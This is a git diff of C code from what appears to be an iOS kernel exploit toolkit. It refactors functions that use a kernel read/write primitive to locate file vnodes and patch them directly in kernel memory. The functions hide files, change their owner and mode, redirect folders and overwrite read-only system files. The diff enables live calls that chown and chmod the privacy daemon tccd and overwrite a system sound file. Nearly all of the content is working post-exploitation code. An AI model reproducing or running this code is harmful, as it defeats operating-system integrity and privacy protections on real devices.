@@ -139,13 +139,12 @@ int funUcred(uint64_t kfd, uint64_t proc) {
     return 0;
 }
 
-uint64_t funVnodeHide(uint64_t kfd, char* filename) {
+uint64_t getVnodeAtPath(uint64_t kfd, char* filename) {
     int file_index = open(filename, O_RDONLY);
     if (file_index == -1) return -1;
     
     uint64_t proc = getProc(kfd, getpid());
-    
-    //get vnode
+
     uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
     uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
     uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
@@ -153,7 +152,19 @@ uint64_t funVnodeHide(uint64_t kfd, char* filename) {
     uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
     uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
     uint64_t vnode = vnode_pac | 0xffffff8000000000;
-    printf("[i] vnode: 0x%llx\n", vnode);
+    
+    printf("[i] %s vnode: 0x%llx\n", filename, vnode);
+    close(file_index);
+    
+    return vnode;
+}
+
+uint64_t funVnodeHide(uint64_t kfd, char* filename) {
+    uint64_t vnode = getVnodeAtPath(kfd, filename);
+    if(vnode == -1) {
+        printf("[-] Unable to get vnode, filename: %s", filename);
+        return -1;
+    }
     
     //vnode_ref, vnode_get
     uint32_t usecount = kread32(kfd, vnode + off_vnode_v_usecount);
@@ -177,8 +188,6 @@ uint64_t funVnodeHide(uint64_t kfd, char* filename) {
     
     printf("[i] %s access ret: %d\n", filename, access(filename, F_OK));
     
-    close(file_index);
-    
     //restore vnode iocount, usecount
     usecount = kread32(kfd, vnode + off_vnode_v_usecount);
     iocount = kread32(kfd, vnode + off_vnode_v_iocount);
@@ -191,19 +200,13 @@ uint64_t funVnodeHide(uint64_t kfd, char* filename) {
 }
 
 uint64_t funVnodeChown(uint64_t kfd, char* filename, uid_t uid, gid_t gid) {
-    int file_index = open(filename, O_RDONLY);
-    if (file_index == -1) return -1;
+
+    uint64_t vnode = getVnodeAtPath(kfd, filename);
+    if(vnode == -1) {
+        printf("[-] Unable to get vnode, filename: %s", filename);
+        return -1;
+    }
     
-    uint64_t proc = getProc(kfd, getpid());
-    
-    //get vnode
-    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
-    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
-    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
-    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
-    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
-    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
-    uint64_t vnode = vnode_pac | 0xffffff8000000000;
     uint64_t v_data = kread64(kfd, vnode + off_vnode_v_data);
     uint32_t v_uid = kread32(kfd, v_data + 0x80);
     uint32_t v_gid = kread32(kfd, v_data + 0x84);
@@ -215,8 +218,6 @@ uint64_t funVnodeChown(uint64_t kfd, char* filename, uid_t uid, gid_t gid) {
     printf("[i] Patching %s vnode->v_gid %d -> %d\n", filename, v_gid, gid);
     kwrite32(kfd, v_data+0x84, gid);
     
-    close(file_index);
-    
     struct stat file_stat;
     if(stat(filename, &file_stat) == 0) {
         printf("[i] %s UID: %d\n", filename, file_stat.st_uid);
@@ -227,22 +228,14 @@ uint64_t funVnodeChown(uint64_t kfd, char* filename, uid_t uid, gid_t gid) {
 }
 
 uint64_t funVnodeChmod(uint64_t kfd, char* filename, mode_t mode) {
-    int file_index = open(filename, O_RDONLY);
-    if (file_index == -1) return -1;
+    uint64_t vnode = getVnodeAtPath(kfd, filename);
+    if(vnode == -1) {
+        printf("[-] Unable to get vnode, filename: %s", filename);
+        return -1;
+    }
     
-    uint64_t proc = getProc(kfd, getpid());
-
-    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
-    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
-    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
-    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
-    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
-    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
-    uint64_t vnode = vnode_pac | 0xffffff8000000000;
     uint64_t v_data = kread64(kfd, vnode + off_vnode_v_data);
     uint32_t v_mode = kread32(kfd, v_data + 0x88);
-    
-    close(file_index);
     
     printf("[i] Patching %s vnode->v_mode %o -> %o\n", filename, v_mode, mode);
     kwrite32(kfd, v_data+0x88, mode);
@@ -352,40 +345,23 @@ uint64_t findRootVnode(uint64_t kfd) {
 }
 
 uint64_t funVnodeRedirectFolder(uint64_t kfd, char* to, char* from) {
-    int file_index = open(to, O_RDONLY);
-    if (file_index == -1) return -1;
-    
-    uint64_t proc = getProc(kfd, getpid());
-    
-    //get vnode
-    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
-    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
-    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
-    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
-    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
-    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
-    uint64_t to_vnode = vnode_pac | 0xffffff8000000000;
+    uint64_t to_vnode = getVnodeAtPath(kfd, to);
+    if(to_vnode == -1) {
+        printf("[-] Unable to get vnode, filename: %s", to);
+        return -1;
+    }
     
     uint8_t to_v_references = kread8(kfd, to_vnode + off_vnode_v_references);
     uint32_t to_usecount = kread32(kfd, to_vnode + off_vnode_v_usecount);
     uint32_t to_v_kusecount = kread32(kfd, to_vnode + off_vnode_v_kusecount);
     
-    close(file_index);
-    
-    file_index = open(from, O_RDONLY);
-    if (file_index == -1) return -1;
-    
-    filedesc_pac = kread64(kfd, proc + off_p_pfd);
-    filedesc = filedesc_pac | 0xffffff8000000000;
-    openedfile = kread64(kfd, filedesc + (8 * file_index));
-    fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
-    fileglob = fileglob_pac | 0xffffff8000000000;
-    vnode_pac = kread64(kfd, fileglob + off_fg_data);
-    uint64_t from_vnode = vnode_pac | 0xffffff8000000000;
+    uint64_t from_vnode = getVnodeAtPath(kfd, from);
+    if(from_vnode == -1) {
+        printf("[-] Unable to get vnode, filename: %s", from);
+        return -1;
+    }
     
     uint64_t from_v_data = kread64(kfd, from_vnode+ off_vnode_v_data);
-    
-    close(file_index);
     
     kwrite32(kfd, to_vnode + off_vnode_v_usecount, to_usecount + 1);
     kwrite32(kfd, to_vnode + off_vnode_v_kusecount, to_v_kusecount + 1);
@@ -395,9 +371,9 @@ uint64_t funVnodeRedirectFolder(uint64_t kfd, char* to, char* from) {
     return 0;
 }
 
-uint64_t funVnodeOverwriteFile(uint64_t kfd, char* file) {
+uint64_t funVnodeOverwriteFile(uint64_t kfd, char* to) {
 
-    int file_index = open(file, O_RDONLY);
+    int file_index = open(to, O_RDONLY);
 
     if (file_index == -1) return -1;
     
@@ -411,9 +387,7 @@ uint64_t funVnodeOverwriteFile(uint64_t kfd, char* file) {
     uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
     uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
     uint64_t to_vnode = vnode_pac | 0xffffff8000000000;
-    printf("[i] %s to_vnode: 0x%llx\n", file, to_vnode);
-    
-    uint16_t to_vnode_vtype = kread16(kfd, to_vnode + off_vnode_v_type);
+    printf("[i] %s to_vnode: 0x%llx\n", to, to_vnode);
     
     uint64_t to_v_mount_pac = kread64(kfd, findRootVnode(kfd) + off_vnode_v_mount);
     uint64_t to_v_mount = to_v_mount_pac | 0xffffff8000000000;
@@ -425,7 +399,7 @@ uint64_t funVnodeOverwriteFile(uint64_t kfd, char* file) {
     
     kwrite32(kfd, fileglob + off_fg_flag, O_ACCMODE);
     
-    printf("[i] %s to_vnode->v_writecount: %d\n", file, kread32(kfd, to_vnode + off_vnode_v_writecount));
+    printf("[i] %s to_vnode->v_writecount: %d\n", to, kread32(kfd, to_vnode + off_vnode_v_writecount));
     kwrite32(kfd, to_vnode + off_vnode_v_writecount, kread32(kfd, to_vnode + off_vnode_v_writecount)+1);
     
     const char* data = "AAAAAAAAAAAAAAAAAAAAAAA";
@@ -522,25 +496,20 @@ int do_fun(uint64_t kfd) {
     funTask(kfd, "kfd");
     
     //Patch
-//    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 501, 501);
+    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 501, 501);
     //Restore
-//    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0, 0);
+    funVnodeChown(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0, 0);
     
     
     //Patch
-//    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0107777);
+    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0107777);
     //Restore
-//    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
+    funVnodeChmod(kfd, "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd", 0100755);
     
     mach_port_t host_self = mach_host_self();
     printf("[i] mach_host_self: 0x%x\n", host_self);
     fun_ipc_entry_lookup(kfd, host_self);
     
-//    NSString *path = [NSString stringWithFormat:@"%@%@", NSHomeDirectory(), @"/Documents/abcd.txt"];
-//    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
-//    [@"Hello, this is an example file!" writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil];
-    
-    //NEW WAY, open with O_RDONLY AND PATCH TO O_RDWR, Actually we don't need to use funVnodeChown, funVndeChmod.
     funVnodeOverwriteFile(kfd, "/System/Library/Audio/UISounds/photoShutter.caf");
     
 
